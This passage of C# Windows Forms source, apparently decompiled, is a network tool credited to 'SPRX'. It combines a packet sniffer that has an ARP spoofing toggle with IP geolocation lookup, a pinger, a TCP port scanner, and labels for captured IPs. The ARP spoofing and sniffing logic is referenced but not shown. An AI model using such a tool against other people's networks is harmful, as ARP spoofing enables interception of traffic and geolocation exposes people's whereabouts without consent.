            this.toMac = this.IPtoMac[this.DropdownValue3()];
          }
        }
        else
          this.isArpSpoofing = false;
        this.mainThread = new Thread(new ThreadStart(this.Listen));
        this.mainThread.Start();
        do
          ;
        while (!this.mainThread.IsAlive);
        this.startButton.Text = "Stop Sniffing";
        this.toIPARP.Enabled = false;
        this.arpSpoofToggle.Enabled = false;
        this.fromIPARP.Enabled = false;
        this.networkBox.Enabled = false;
        this.metroButton2.Enabled = true;
        this.sourceIPBox.Enabled = false;
        this.sourcePortBox.Enabled = false;
        this.browseButton.Enabled = false;
        this.refreshButton.Enabled = true;
        this.savePath.Enabled = false;
        this.dataGridView1.Visible = true;
        this.running = true;
        this.tabControl.SelectTab(1);
      }
      else
      {
        if (this.isArpSpoofing)
          this.SendReverseArpPackets();
        this.toIPARP.Enabled = true;
        this.arpSpoofToggle.Enabled = true;
        this.metroButton2.Enabled = false;
        this.fromIPARP.Enabled = true;
        this.networkBox.Enabled = true;
        this.sourceIPBox.Enabled = true;
        this.sourcePortBox.Enabled = true;
        this.browseButton.Enabled = true;
        this.refreshButton.Enabled = false;
        this.savePath.Enabled = true;
        this.running = false;
        this.mainThread.Abort();
        this.list = new BindingList<ListObject>();
        this.startButton.Text = "Start Sniffing";
        this.metroButton4.Visible = false;
        this.dataGridView1.Visible = false;
      }
    }

    private void metroButton1_Click(object sender, EventArgs e)
    {
      this.list.Clear();
    }

    private void copyIPToolStripMenuItem_Click(object sender, EventArgs e)
    {
      Clipboard.SetText(this.CurrentIP());
    }

    public string ShowDialog(string caption)
    {
      MetroForm metroForm = new MetroForm();
      metroForm.Theme = MetroThemeStyle.Dark;
      metroForm.Width = 230;
      metroForm.Height = 150;
      metroForm.SizeGripStyle = SizeGripStyle.Hide;
      metroForm.MaximizeBox = false;
      metroForm.Text = caption;
      metroForm.StartPosition = FormStartPosition.CenterScreen;
      metroForm.Style = this.themes[this.styleBox.SelectedIndex];
      MetroForm prompt = metroForm;
      MetroTextBox metroTextBox1 = new MetroTextBox();
      metroTextBox1.Left = 30;
      metroTextBox1.Top = 70;
      metroTextBox1.Width = 170;
      metroTextBox1.Theme = MetroThemeStyle.Dark;
      MetroTextBox metroTextBox2 = metroTextBox1;
      MetroButton metroButton1 = new MetroButton();
      metroButton1.Text = "Save";
      metroButton1.Left = 30;
      metroButton1.Width = 170;
      metroButton1.Top = 100;
      metroButton1.Theme = MetroThemeStyle.Dark;
      metroButton1.UseStyleColors = true;
      metroButton1.Style = this.themes[this.styleBox.SelectedIndex];
      metroButton1.DialogResult = DialogResult.OK;
      MetroButton metroButton2 = metroButton1;
      metroButton2.Click += (EventHandler) ((sender, e) => prompt.Close());
      prompt.Controls.Add((Control) metroTextBox2);
      prompt.Controls.Add((Control) metroButton2);
      prompt.AcceptButton = (IButtonControl) metroButton2;
      return prompt.ShowDialog() == DialogResult.OK ? metroTextBox2.Text : "";
    }

    private void addLabelToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.CurrentIP() == "Multiple")
      {
        int num = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Can't Label IPs, which External IP is \"Multiple\"!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else
      {
        string str1 = this.ShowDialog("Enter a Name:");
        if (str1 == "")
          return;
        string contents = "";
        StreamReader streamReader = System.IO.File.OpenText(this.savePath.Text);
        string str2;
        while ((str2 = streamReader.ReadLine()) != null)
        {
          if (!str2.Contains(this.CurrentIP()))
            contents = contents + str2 + Environment.NewLine;
        }
        streamReader.Close();
        System.IO.File.WriteAllText(this.savePath.Text, contents);
        using (StreamWriter streamWriter = new StreamWriter(this.savePath.Text, true))
        {
          streamWriter.WriteLine(str1 + " - " + this.CurrentIP());
          streamWriter.Close();
        }
        string str3 = this.CurrentIP();
        for (int index = 0; index < this.dataGridView1.RowCount; ++index)
        {
          if (this.dataGridView1[1, index].Value.ToString() == str3)
            this.dataGridView1[0, index].Value = (object) str1;
        }
      }
    }

    private void refreshButton_Click(object sender, EventArgs e)
    {
      this.list.Clear();
      if (this.arpSpoofToggle.Checked)
      {
        if (this.DropdownValue2() != "" && this.DropdownValue3() != "")
        {
          this.isArpSpoofing = true;
          this.fromIP = this.DropdownValue2();
          this.fromMac = this.IPtoMac[this.DropdownValue2()];
          this.toIP = this.DropdownValue3();
          this.toMac = this.IPtoMac[this.DropdownValue3()];
        }
      }
      else
        this.isArpSpoofing = false;
      this.tabControl.SelectTab(1);
      this.mainThread = new Thread(new ThreadStart(this.Listen));
      this.mainThread.Start();
      do
        ;
      while (!this.mainThread.IsAlive);
      this.startButton.Text = "Stop Sniffing";
      this.toIPARP.Enabled = false;
      this.fromIPARP.Enabled = false;
      this.networkBox.Enabled = false;
      this.sourceIPBox.Enabled = false;
      this.sourcePortBox.Enabled = false;
      this.browseButton.Enabled = false;
      this.running = true;
    }

    private void metroButton3_Click(object sender, EventArgs e)
    {
      if (this.metroTextBox2.Text == "")
      {
        int num1 = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Enter an IP!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else
      {
        using (WebClient webClient = new WebClient())
        {
          JObject jobject = JObject.Parse(webClient.DownloadString("http://ip-api.com/json/" + this.metroTextBox2.Text));
          this.metroTextBox1.Text = (string) jobject["isp"];
          this.metroTextBox3.Text = (string) jobject["country"];
          this.metroTextBox4.Text = (string) jobject["regionName"];
          this.metroTextBox5.Text = (string) jobject["city"];
        }
        if (!(this.metroTextBox1.Text == "") || !(this.metroTextBox3.Text == "") || !(this.metroTextBox4.Text == "") || !(this.metroTextBox5.Text == ""))
          return;
        int num2 = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Failed Trace of this IP!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void traceLocationToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.tabControl.SelectTab(2);
      this.metroTextBox2.Text = this.CurrentIP();
      using (WebClient webClient = new WebClient())
      {
        JObject jobject = JObject.Parse(webClient.DownloadString("http://ip-api.com/json/" + this.metroTextBox2.Text));
        this.metroTextBox1.Text = (string) jobject["isp"];
        this.metroTextBox3.Text = (string) jobject["country"];
        this.metroTextBox4.Text = (string) jobject["regionName"];
        this.metroTextBox5.Text = (string) jobject["city"];
      }
    }

    private void bootOfflineToolStripMenuItem_Click(object sender, EventArgs e)
    {
      int num = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Not working yet!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    private void metroButton2_Click(object sender, EventArgs e)
    {
      for (int index = 0; index < this.dataGridView1.RowCount; ++index)
        this.dataGridView1[0, index].Value = (object) "";
    }

    private void metroButton5_Click(object sender, EventArgs e)
    {
      if (this.metroTextBox6.Text == "")
      {
        int num1 = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Enter an IP!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (this.pingingIP)
      {
        int num2 = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Pinger is busy!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else
      {
        this.pingingIP = true;
        this.metroButton5.Text = "Wait...";
        this.ipPinger.RunWorkerAsync();
      }
    }

    private void ipPinger_DoWork(object sender, DoWorkEventArgs e)
    {
      this.ipOnline = new Ping().Send(this.metroTextBox6.Text).Status.ToString() == "Success";
    }

    private void ipPinger_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      this.metroButton5.Text = "Ping IP";
      if (this.ipOnline)
      {
        this.metroLabel17.Text = "IP is Online!";
        this.metroLabel17.Style = MetroColorStyle.Green;
      }
      else
      {
        this.metroLabel17.Text = "IP is Offline!";
        this.metroLabel17.Style = MetroColorStyle.Red;
      }
      this.pingingIP = false;
    }

    private void AddGrid2(PortObject obj)
    {
      try
      {
        if (this.dataGridView2.InvokeRequired)
        {
          this.Invoke((Delegate) new Form1.AddGridCallback2(this.AddGrid2), (object) obj);
        }
        else
        {
          this.list2.Add(obj);
          if (this.list2.Count > 6)
            this.dataGridView2.FirstDisplayedScrollingRowIndex = this.list2.Count - 6;
        }
      }
      catch (Exception ex)
      {
      }
    }

    private bool IsIpAddress(string Address)
    {
      return new Regex("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b").IsMatch(Address);
    }

    private bool LookupDNSName(string ScanAddress, out IPAddress ScanIPAddress)
    {
      ScanIPAddress = (IPAddress) null;
      IPHostEntry hostEntry;
      try
      {
        hostEntry = Dns.GetHostEntry(ScanAddress);
      }
      catch (SocketException ex)
      {
        return false;
      }
      if ((uint) hostEntry.AddressList.Length <= 0U)
        return false;
      ScanIPAddress = hostEntry.AddressList[0];
      return true;
    }

    private void RefreshGridIndex2()
    {
      try
      {
        if (this.dataGridView2.InvokeRequired)
        {
          this.Invoke((Delegate) new Form1.RefreshGridCallback2(this.RefreshGridIndex2));
        }
        else
        {
          this.dataGridView2.Update();
          this.dataGridView2.EndEdit();
          this.dataGridView2.Refresh();
        }
      }
      catch (Exception ex)
      {
      }
    }

    private void Scan(object sender, DoWorkEventArgs e)
    {
      this.SetDS2(this.list2);
      try
      {
        string str = (uint) this.IP.Length <= 0U ? "127.0.0.1" : this.IP;
        IPAddress ScanIPAddress;
        if (this.IsIpAddress(str))
          ScanIPAddress = IPAddress.Parse(str);
        else if (!this.LookupDNSName(str, out ScanIPAddress))
        {
          int num = (int) MessageBox.Show("Error looking up" + str + "\n");
          return;
        }
        for (int index = 0; index < this.ports.Length; ++index)
        {
          PortObject portObject = new PortObject()
          {
            number = this.ports[index]
          };
          portObject.status = !this.ScanPort(ScanIPAddress, this.ports[index]) ? "CLOSED" : "OPEN";
          this.AddGrid2(portObject);
          this.RefreshGridIndex2();
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.ToString());
      }
    }

    private bool ScanPort(IPAddress Address, int Port)
    {
      TcpClient tcpClient = new TcpClient();
      try
      {
        tcpClient.Connect(Address, Port);
        tcpClient.GetStream().Close();
        tcpClient.Close();
      }
      catch (SocketException ex)
      {
        return false;
      }
      return true;
    }

    private void dataGridView2_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
    {
      int rowIndex = e.RowIndex;
      if (rowIndex < 0)
        return;
      DataGridViewRow row = this.dataGridView2.Rows[rowIndex];
      if (!(row.Cells[1].Value.ToString() == "OPEN"))
        return;
      row.DefaultCellStyle.BackColor = Color.Green;
    }

    private void styleBox_SelectedIndexChanged(object sender, EventArgs e)
    {
      this.styleManager.Style = this.themes[this.styleBox.SelectedIndex];
      Settings.Default.style = this.styleBox.SelectedItem.ToString();
      Settings.Default.Save();
    }

    private void removeLabelToolStripMenuItem_Click(object sender, EventArgs e)
    {
      string tempFileName = Path.GetTempFileName();
      string str1 = this.CurrentIP();
      using (StreamReader streamReader = new StreamReader(this.savePath.Text))
      {
        using (StreamWriter streamWriter = new StreamWriter(tempFileName))
        {
          string str2;
          while ((str2 = streamReader.ReadLine()) != null)
          {
            if (str2 != this.CurrentGT() + " - " + str1)
              streamWriter.WriteLine(str2);
          }
        }
      }
      System.IO.File.Delete(this.savePath.Text);
      System.IO.File.Move(tempFileName, this.savePath.Text);
      for (int index = 0; index < this.dataGridView1.RowCount; ++index)
      {
        if (this.dataGridView1[1, index].Value.ToString() == str1)
          this.dataGridView1[0, index].Value = (object) "";
      }
    }

    private void metroButton1_Click_1(object sender, EventArgs e)
    {
      if (this.savePath.Text != "")
      {
        Process.Start(this.savePath.Text);
      }
      else
      {
        int num = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Select a .txt File you want to save your Labels to first!\nYou can do so on the main Page!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void metroButton4_Click(object sender, EventArgs e)
    {
      if (this.isArpSpoofing)
        this.SendReverseArpPackets();
      this.toIPARP.Enabled = true;
      this.savePath.Enabled = true;
      this.arpSpoofToggle.Enabled = true;
      this.fromIPARP.Enabled = true;
      this.networkBox.Enabled = true;
      this.sourceIPBox.Enabled = true;
      this.sourcePortBox.Enabled = true;
      this.browseButton.Enabled = true;
      this.metroButton2.Enabled = false;
      this.refreshButton.Enabled = false;
      this.running = false;
      this.mainThread.Abort();
      this.list = new BindingList<ListObject>();
      this.startButton.Text = "Start Sniffing";
      this.metroButton4.Visible = false;
      this.tabControl.SelectTab(0);
      this.dataGridView1.Visible = false;
    }

    private void tabControl_SelectedIndexChanged(object sender, EventArgs e)
    {
      if (!this.running)
        return;
      if ((uint) this.tabControl.SelectedIndex > 0U)
        this.metroButton4.Visible = true;
      else
        this.metroButton4.Visible = false;
    }

    private void metroLabel24_Click(object sender, EventArgs e)
    {
      Process.Start("https://www.youtube.com/TwainsMusic");
    }

    private void metroButton7_Click(object sender, EventArgs e)
    {
      using (StreamWriter streamWriter = new StreamWriter(this.savePath.Text))
        streamWriter.Close();
      for (int index = 0; index < this.dataGridView1.RowCount; ++index)
        this.dataGridView1[0, index].Value = (object) "";
    }

    private void SetDS2(BindingList<PortObject> list)
    {
      if (this.dataGridView2.InvokeRequired)
      {
        this.Invoke((Delegate) new Form1.SetDSCallback2(this.SetDS2), (object) list);
      }
      else
      {
        this.dataGridView2.DataSource = (object) null;
        this.dataGridView2.DataSource = (object) list;
        this.dataGridView2.Columns["number"].HeaderText = "Port Number";
        this.dataGridView2.Columns["status"].HeaderText = "Status";
      }
    }

    private void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      this.scanningPort = false;
      this.metroButton6.Text = "Scan Ports";
    }

    private void metroButton6_Click(object sender, EventArgs e)
    {
      if (this.metroTextBox6.Text == "")
      {
        int num1 = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Enter an IP!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (this.scanningPort)
      {
        int num2 = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Scanner is busy!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else
      {
        this.dataGridView2.Visible = true;
        this.dataGridView2.AllowUserToAddRows = false;
        this.dataGridView2.AllowUserToDeleteRows = false;
        this.dataGridView2.AllowUserToResizeColumns = false;
        this.dataGridView2.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
        this.dataGridView2.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
        this.dataGridView2.MultiSelect = false;
        this.dataGridView2.RowHeadersVisible = false;
        this.dataGridView2.RowTemplate.Height = 24;
        this.dataGridView2.ScrollBars = ScrollBars.Vertical;
        this.dataGridView2.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
        this.dataGridView2.TabIndex = 0;
        this.IP = this.metroTextBox6.Text;
        this.scanningPort = true;
        this.metroButton6.Text = "Wait...";
        BackgroundWorker backgroundWorker = new BackgroundWorker();
        backgroundWorker.DoWork += new DoWorkEventHandler(this.Scan);
        backgroundWorker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.worker_RunWorkerCompleted);
        backgroundWorker.RunWorkerAsync();
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.styleManager = new MetroFramework.Components.MetroStyleManager(this.components);
            this.selectSavePath = new System.Windows.Forms.OpenFileDialog();
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.addLabelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.removeLabelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyIPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.traceLocationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.metroLabel24 = new MetroFramework.Controls.MetroLabel();
            this.ipPinger = new System.ComponentModel.BackgroundWorker();
            this.styleBox = new MetroFramework.Controls.MetroComboBox();
            this.metroLabel18 = new MetroFramework.Controls.MetroLabel();
            this.howToTab = new MetroFramework.Controls.MetroTabPage();
            this.metroPanel12 = new MetroFramework.Controls.MetroPanel();
            this.dataGridView2 = new System.Windows.Forms.DataGridView();
            this.metroLabel15 = new MetroFramework.Controls.MetroLabel();
            this.metroLabel16 = new MetroFramework.Controls.MetroLabel();
            this.metroPanel11 = new MetroFramework.Controls.MetroPanel();
            this.metroLabel17 = new MetroFramework.Controls.MetroLabel();
            this.metroLabel14 = new MetroFramework.Controls.MetroLabel();
            this.metroLabel13 = new MetroFramework.Controls.MetroLabel();
            this.metroPanel8 = new MetroFramework.Controls.MetroPanel();
            this.metroButton6 = new MetroFramework.Controls.MetroButton();
            this.metroTextBox6 = new MetroFramework.Controls.MetroTextBox();
            this.metroButton5 = new MetroFramework.Controls.MetroButton();
            this.metroLabel12 = new MetroFramework.Controls.MetroLabel();
            this.locationTab = new MetroFramework.Controls.MetroTabPage();
            this.metroPanel7 = new MetroFramework.Controls.MetroPanel();
            this.metroTile1 = new MetroFramework.Controls.MetroTile();
            this.metroTextBox5 = new MetroFramework.Controls.MetroTextBox();
            this.metroLabel11 = new MetroFramework.Controls.MetroLabel();
            this.metroTextBox4 = new MetroFramework.Controls.MetroTextBox();
            this.metroLabel10 = new MetroFramework.Controls.MetroLabel();
            this.metroTextBox3 = new MetroFramework.Controls.MetroTextBox();
            this.metroLabel9 = new MetroFramework.Controls.MetroLabel();
            this.metroTextBox1 = new MetroFramework.Controls.MetroTextBox();
            this.metroLabel6 = new MetroFramework.Controls.MetroLabel();
            this.metroPanel6 = new MetroFramework.Controls.MetroPanel();
            this.metroTextBox2 = new MetroFramework.Controls.MetroTextBox();
            this.metroButton3 = new MetroFramework.Controls.MetroButton();
            this.metroLabel8 = new MetroFramework.Controls.MetroLabel();
            this.snifferTab = new MetroFramework.Controls.MetroTabPage();
            this.metroPanel9 = new MetroFramework.Controls.MetroPanel();
            this.metroButton7 = new MetroFramework.Controls.MetroButton();
            this.metroButton1 = new MetroFramework.Controls.MetroButton();
            this.metroButton2 = new MetroFramework.Controls.MetroButton();
            this.dataGridView1 = new System.Windows.Forms.DataGridView();
            this.refreshButton = new MetroFramework.Controls.MetroButton();
            this.mainTab = new MetroFramework.Controls.MetroTabPage();
            this.metroButton4 = new MetroFramework.Controls.MetroButton();
            this.metroPanel5 = new MetroFramework.Controls.MetroPanel();
            this.startButton = new MetroFramework.Controls.MetroButton();
            this.metroPanel4 = new MetroFramework.Controls.MetroPanel();
            this.browseButton = new MetroFramework.Controls.MetroButton();
            this.savePath = new MetroFramework.Controls.MetroTextBox();
            this.metroLabel7 = new MetroFramework.Controls.MetroLabel();
            this.metroPanel3 = new MetroFramework.Controls.MetroPanel();
            this.fromIPARP = new MetroFramework.Controls.MetroComboBox();
            this.toIPARP = new MetroFramework.Controls.MetroComboBox();
            this.metroLabel5 = new MetroFramework.Controls.MetroLabel();
            this.metroLabel1 = new MetroFramework.Controls.MetroLabel();
            this.arpSpoofToggle = new MetroFramework.Controls.MetroToggle();
            this.metroLabel3 = new MetroFramework.Controls.MetroLabel();
            this.metroPanel2 = new MetroFramework.Controls.MetroPanel();
            this.sourcePortBox = new MetroFramework.Controls.MetroTextBox();
            this.metroLabel4 = new MetroFramework.Controls.MetroLabel();
            this.sourceIPBox = new MetroFramework.Controls.MetroTextBox();
            this.metroLabel2 = new MetroFramework.Controls.MetroLabel();
            this.metroPanel1 = new MetroFramework.Controls.MetroPanel();
            this.networkBox = new MetroFramework.Controls.MetroComboBox();
            this.networkLabel = new MetroFramework.Controls.MetroLabel();
            this.tabControl = new MetroFramework.Controls.MetroTabControl();
            this.metroTabPage1 = new MetroFramework.Controls.MetroTabPage();
            this.metroLabel20 = new MetroFramework.Controls.MetroLabel();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.styleManager)).BeginInit();
            this.contextMenuStrip1.SuspendLayout();
            this.howToTab.SuspendLayout();
            this.metroPanel12.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.dataGridView2)).BeginInit();
            this.metroPanel11.SuspendLayout();
            this.metroPanel8.SuspendLayout();
            this.locationTab.SuspendLayout();
            this.metroPanel7.SuspendLayout();
            this.metroPanel6.SuspendLayout();
            this.snifferTab.SuspendLayout();
            this.metroPanel9.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).BeginInit();
            this.mainTab.SuspendLayout();
            this.metroPanel5.SuspendLayout();
            this.metroPanel4.SuspendLayout();
            this.metroPanel3.SuspendLayout();
            this.metroPanel2.SuspendLayout();
            this.metroPanel1.SuspendLayout();
            this.tabControl.SuspendLayout();
            this.metroTabPage1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // styleManager
            // 
            this.styleManager.Owner = this;
            this.styleManager.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // selectSavePath
            // 
            this.selectSavePath.DefaultExt = "txt";
            this.selectSavePath.InitialDirectory = "C:\\";
            this.selectSavePath.Title = "Select .txt File you want to save your Details to";
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.addLabelToolStripMenuItem,
            this.removeLabelToolStripMenuItem,
            this.copyIPToolStripMenuItem,
            this.traceLocationToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(159, 92);
            // 
            // addLabelToolStripMenuItem
            // 
            this.addLabelToolStripMenuItem.Name = "addLabelToolStripMenuItem";
            this.addLabelToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.addLabelToolStripMenuItem.Text = "Add Label";
            this.addLabelToolStripMenuItem.Click += new System.EventHandler(this.addLabelToolStripMenuItem_Click);
            // 
            // removeLabelToolStripMenuItem
            // 
            this.removeLabelToolStripMenuItem.Name = "removeLabelToolStripMenuItem";
            this.removeLabelToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.removeLabelToolStripMenuItem.Text = "Remove Label";
            this.removeLabelToolStripMenuItem.Click += new System.EventHandler(this.removeLabelToolStripMenuItem_Click);
            // 
            // copyIPToolStripMenuItem
            // 
            this.copyIPToolStripMenuItem.Name = "copyIPToolStripMenuItem";
            this.copyIPToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.copyIPToolStripMenuItem.Text = "Copy IP";
            this.copyIPToolStripMenuItem.Click += new System.EventHandler(this.copyIPToolStripMenuItem_Click);
            // 
            // traceLocationToolStripMenuItem
            // 
            this.traceLocationToolStripMenuItem.Name = "traceLocationToolStripMenuItem";
            this.traceLocationToolStripMenuItem.Size = new System.Drawing.Size(158, 22);
            this.traceLocationToolStripMenuItem.Text = "Trace Location";
            this.traceLocationToolStripMenuItem.Click += new System.EventHandler(this.traceLocationToolStripMenuItem_Click);
            // 
            // metroLabel24
            // 
            this.metroLabel24.AutoSize = true;
            this.metroLabel24.FontSize = MetroFramework.MetroLabelSize.Small;
            this.metroLabel24.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel24.Location = new System.Drawing.Point(592, 420);
            this.metroLabel24.Name = "metroLabel24";
            this.metroLabel24.Size = new System.Drawing.Size(94, 15);
            this.metroLabel24.TabIndex = 14;
            this.metroLabel24.Text = "Created by SPRX";
            this.metroLabel24.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel24.UseStyleColors = true;
            this.metroLabel24.Click += new System.EventHandler(this.metroLabel24_Click);
            // 
            // ipPinger
            // 
            this.ipPinger.DoWork += new System.ComponentModel.DoWorkEventHandler(this.ipPinger_DoWork);
            this.ipPinger.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.ipPinger_RunWorkerCompleted);
            // 
            // styleBox
            // 
            this.styleBox.FormattingEnabled = true;
            this.styleBox.ItemHeight = 23;
            this.styleBox.Location = new System.Drawing.Point(550, 46);
            this.styleBox.Name = "styleBox";
            this.styleBox.Size = new System.Drawing.Size(121, 29);
            this.styleBox.TabIndex = 15;
            this.styleBox.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.styleBox.UseSelectable = true;
            this.styleBox.SelectedIndexChanged += new System.EventHandler(this.styleBox_SelectedIndexChanged);
            // 
            // metroLabel18
            // 
            this.metroLabel18.AutoSize = true;
            this.metroLabel18.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel18.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel18.Location = new System.Drawing.Point(491, 46);
            this.metroLabel18.Name = "metroLabel18";
            this.metroLabel18.Size = new System.Drawing.Size(53, 25);
            this.metroLabel18.TabIndex = 14;
            this.metroLabel18.Text = "Style:";
            this.metroLabel18.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel18.UseStyleColors = true;
            // 
            // howToTab
            // 
            this.howToTab.Controls.Add(this.metroPanel12);
            this.howToTab.Controls.Add(this.metroPanel11);
            this.howToTab.Controls.Add(this.metroPanel8);
            this.howToTab.HorizontalScrollbarBarColor = true;
            this.howToTab.HorizontalScrollbarHighlightOnWheel = false;
            this.howToTab.HorizontalScrollbarSize = 10;
            this.howToTab.Location = new System.Drawing.Point(4, 38);
            this.howToTab.Name = "howToTab";
            this.howToTab.Size = new System.Drawing.Size(643, 317);
            this.howToTab.TabIndex = 4;
            this.howToTab.Text = "IP Pinger/Port Scanner";
            this.howToTab.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.howToTab.UseStyleColors = true;
            this.howToTab.VerticalScrollbarBarColor = true;
            this.howToTab.VerticalScrollbarHighlightOnWheel = false;
            this.howToTab.VerticalScrollbarSize = 10;
            this.howToTab.Visible = false;
            // 
            // metroPanel12
            // 
            this.metroPanel12.Controls.Add(this.dataGridView2);
            this.metroPanel12.Controls.Add(this.metroLabel15);
            this.metroPanel12.Controls.Add(this.metroLabel16);
            this.metroPanel12.HorizontalScrollbarBarColor = true;
            this.metroPanel12.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel12.HorizontalScrollbarSize = 10;
            this.metroPanel12.Location = new System.Drawing.Point(0, 78);
            this.metroPanel12.Name = "metroPanel12";
            this.metroPanel12.Size = new System.Drawing.Size(644, 231);
            this.metroPanel12.TabIndex = 19;
            this.metroPanel12.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel12.VerticalScrollbarBarColor = true;
            this.metroPanel12.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel12.VerticalScrollbarSize = 10;
            // 
            // dataGridView2
            // 
            this.dataGridView2.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.dataGridView2.Location = new System.Drawing.Point(8, 28);
            this.dataGridView2.Name = "dataGridView2";
            this.dataGridView2.Size = new System.Drawing.Size(631, 198);
            this.dataGridView2.TabIndex = 19;
            this.dataGridView2.RowsAdded += new System.Windows.Forms.DataGridViewRowsAddedEventHandler(this.dataGridView2_RowsAdded);
            // 
            // metroLabel15
            // 
            this.metroLabel15.AutoSize = true;
            this.metroLabel15.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel15.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel15.Location = new System.Drawing.Point(78, 0);
            this.metroLabel15.Name = "metroLabel15";
            this.metroLabel15.Size = new System.Drawing.Size(0, 0);
            this.metroLabel15.TabIndex = 7;
            this.metroLabel15.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel15.UseStyleColors = true;
            // 
            // metroLabel16
            // 
            this.metroLabel16.AutoSize = true;
            this.metroLabel16.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel16.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel16.Location = new System.Drawing.Point(3, 0);
            this.metroLabel16.Name = "metroLabel16";
            this.metroLabel16.Size = new System.Drawing.Size(155, 25);
            this.metroLabel16.TabIndex = 6;
            this.metroLabel16.Text = "Port Scan Results: ";
            this.metroLabel16.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel16.UseStyleColors = true;
            // 
            // metroPanel11
            // 
            this.metroPanel11.Controls.Add(this.metroLabel17);
            this.metroPanel11.Controls.Add(this.metroLabel14);
            this.metroPanel11.Controls.Add(this.metroLabel13);
            this.metroPanel11.HorizontalScrollbarBarColor = true;
            this.metroPanel11.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel11.HorizontalScrollbarSize = 10;
            this.metroPanel11.Location = new System.Drawing.Point(0, 40);
            this.metroPanel11.Name = "metroPanel11";
            this.metroPanel11.Size = new System.Drawing.Size(644, 32);
            this.metroPanel11.TabIndex = 18;
            this.metroPanel11.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel11.VerticalScrollbarBarColor = true;
            this.metroPanel11.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel11.VerticalScrollbarSize = 10;
            // 
            // metroLabel17
            // 
            this.metroLabel17.AutoSize = true;
            this.metroLabel17.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel17.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel17.Location = new System.Drawing.Point(118, 0);
            this.metroLabel17.Name = "metroLabel17";
            this.metroLabel17.Size = new System.Drawing.Size(0, 0);
            this.metroLabel17.TabIndex = 20;
            this.metroLabel17.Theme = MetroFramework.MetroThemeStyle.Dark;
